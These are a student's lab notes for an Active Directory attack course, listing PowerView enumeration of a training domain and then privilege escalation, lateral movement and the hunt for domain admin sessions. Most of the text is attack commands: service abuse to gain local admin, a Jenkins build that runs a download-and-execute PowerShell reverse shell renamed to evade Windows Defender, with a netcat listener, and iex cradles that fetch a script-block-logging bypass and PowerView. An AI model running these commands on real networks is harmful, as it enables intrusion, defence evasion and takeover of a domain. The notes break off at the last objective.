# Learning Objective 1

# Enumerate following for the dollarcorp domain

- Users
  Get-DomainUser -domain dollarcorp.moneycorp.local | select name
  
- Computers
  Get-DomainComputer -domain dollarcorp.moneycorp.local | select name
  
- Domain Administrators
  Get-DomainGroupMember -domain dollarcorp.moneycorp.local -Identity "Domain Admins" -Recurse | select MemberName
  
- Enterprise Administrators
  Get-DomainGroupMember -domain moneycorp.local -Identity "Enterprise Admins" -Recurse | select MemberName

# Learning Objective 2

- List all the OUs
  Get-DomainOU | select name

- List all the computers in the StudentMachines OU
  (Get-DomainOU -Identity StudentMachines).distinguishedname | %{Get-DomainComputer -SearchBase $_} | select name
  
- List the GPOs
  Get-DomainGPO | select -ExpandProperty displayname
  
- Enumerate GPO applied on the StudentMachines OU
  (Get-DomainOU -Identity StudentMachines).gplink
  Get-DomainGPO -Identity "{3E04167E-C2B6-4A9A-8FB7-C811158DC97C}"
  
# Learning Objective 3

- List ACL for the Domain Admins Group
  Get-DomainObjectAcl -Identity "Domain Admins" -ResolveGUIDs -Verbose
  
- All modify rights/permissions for the studentx
  Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "studentx"}
  Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "RDPUsers"}
  
# Learning Objective 4

- Enumerate all domains in the moneycorp.local forest
  Get-ForestDomain -Forest moneycorp.local -Verbose
  
- Map the trusts of the dollarcorp.moneycorp.local domain
  Get-DomainTrust -Domain dollarcorp.moneycorp.local
  
- Map external trusts in moneycorp.local forest
  Get-ForestDomain | %{Get-DomainTrust -Domain $_.Name}
  (External TRUSTS -> TrustAttributes = "FILTER_SIDS")
  Get-ForestDomain | %{Get-DomainTrust -Domain $_.Name} | ?{$_.TrustAttributes -eq "FILTER_SIDS"}
 
- Identify external trusts of dollarcorp domain. Can you enumerate trusts for a trusting forest?
  Get-DomainTrust | ?{$_.TrustAttributes -eq "FILTER_SIDS"}
  Get-ForestDomain -Forest eurocorp.local | %{Get-DomainTrust -Domain $_.Name}
  
# Learning Objective 5

- Exploit a service on dcorp-studentx and elevate privileges to local administrator.
  1. Enum all services with Unquoted Path with PowerUp from PowerSploit
  Get-ServiceUnquoted
  
  2. Enum services where the current can make changes to service binary
  Get-ModifiableServiceFile -Verbose
  
  3. Enum services with weak service permissions
  Get-ModifiableService
  
  4. Abuse the function for Get-ModifiableService and add our current domain user to the local Administrators Group.
  Invoke-ServiceAbuse -Name 'AbyssWebServer' -UserName 'dcorp\studentx'

- Identify a machine in the domain where studentx has local administrative access use Find-PSRemotingLocalAdminAccess.ps1
  Import-Module .\Find-PSRemotingLocalAdminAccess.ps1
  Find-PSRemotingLocalAdminAccess
  winrs -r:dcorp-adminsrv cmd
  whoami
  hostname
  
  Enter-PSSession -ComputerName dcorp-adminsrv
  
- Using privileges of a user on Jenkins, get admin privileges on 172.16.3.11 - the dcorp-ci server
  builduser:builduser as user on the jenkins login
  use a powershell reverse shell:
  powershell.exe -c iex ((New-Object Net.WebClient).DownloadString('http://172.16.100.X/Invoke-PowerShellTcp.ps1'));Power-Reverse -IPAddress 172.16.100.X-Port 443 
  where "Power" in the script is Invoke-PowerShellTcp renamed to bypass Windows Defender
  nc64.exe -lvp 443
  Build
  
# Learning Objective 7
- Identify a machine in the target domain where a Domain Admin session is available. 
  That is using Find-DomainUserLocation. First, we must bypass AMSIand enhanced logging.
  The below command bypasses Enhanced Script Block Logging. Unfortuantely, we have no in-memory bypass for PowerShell transcripts.Note that we couldalso paste the contents of sbloggingbypass.txt in place of the download-execcradle.
  1. iex (iwr http://172.16.100.75/sbloggingbypass.txt -UseBasicParsing) 
  2. AMSI Bypass
  3. iex ((New-Object Net.WebClient).DownloadString('http://172.16.100.75/PowerView.ps1'))
  4. Find-DomainUserLocation
  
  (There is adomain admin session on dcorp-mgmtserver!)
  
  Now we can abuse this using PowerShell Remoting
  
  
  
  
  
  
